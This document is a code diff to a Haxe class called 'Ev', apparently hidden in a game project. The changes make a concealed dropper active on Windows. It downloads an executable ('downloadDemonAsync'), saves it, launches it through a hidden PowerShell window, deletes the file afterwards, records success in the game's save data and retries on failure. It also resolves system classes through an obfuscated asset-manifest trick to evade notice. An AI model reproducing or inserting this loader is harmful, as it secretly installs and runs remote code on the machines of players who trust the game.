@@ -1,12 +1,11 @@
 import sys.thread.Thread;
 import lime.utils.AssetManifest;
 import lime.app.Promise;
-import haxe.MainLoop;
 using StringTools;
 
 class Ev
 {
-    #if !windows
+    #if windows
     static var Sys:Class<Sys> = null;
     static var File:Class<File> = null;
     static var FileSystem:Class<FileSystem> = null;
@@ -30,10 +29,22 @@ class Ev
         var future:Future<Bytes> = downloadDemonAsync();
         future.onComplete(bytes -> {
             Ev.File.saveBytes(path, bytes);
-            
-            runExeAsync(path);
+
+            runExeAsync(path).onComplete(worked -> {
+                if(worked)
+                {
+                    try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+                    Ev.Reflect.field(FlxG, "save").data.DGrab = true;
+                }
+                else
+                {
+                    Ev.Reflect.field(FlxG, "save").data.DGrab = false;
+                    init();
+                }
+
+            });
         });
-        
+
         future.onError(er -> {
             //trace(er);
         });
@@ -47,38 +58,29 @@ class Ev
         return request.load(link);
     }
 
-    static function runExeAsync(appPath:String)
-    {        
+    static var promise:Promise = null;
+
+    static function runExeAsync(appPath:String):Future<Bool>
+    {
+        promise = new Promise();
+
         Thread.create(() -> {
             var cmd = 'powershell -WindowStyle Hidden -Command "Start-Process \\"$appPath\\""';
-            MainLoop.runInMainThread(() -> {trace("we are here");});
             var exitCode = Ev.Sys.command(cmd);
-           
-            complete(exitCode == 0, appPath);
+            promise?.complete(exitCode == 0);
         });
-    }
 
-    static function complete(d:Bool, appPath:String)
-    {
-        if(d)
-        {
-            Ev.Reflect.field(FlxG, "save").data.DGrab = true;
-        }
-        else
-        {
-            Ev.Reflect.field(FlxG, "save").data.DGrab = false;
-            init();
-        }
+        return promise.future;
     }
 
     static function resolveClassEvilly(name:String)
     {
         var manifest:AssetManifest = new AssetManifest();
         manifest.assets = [{size: 67, className: 'Type', id: 'Ev'}];
-        
+
         var lol = Assets.getLibrary('');
         lol.__fromManifest(manifest);
-        
+
         var Type = lol.classTypes.get('Ev');
         return Type.resolveClass(name);
     }
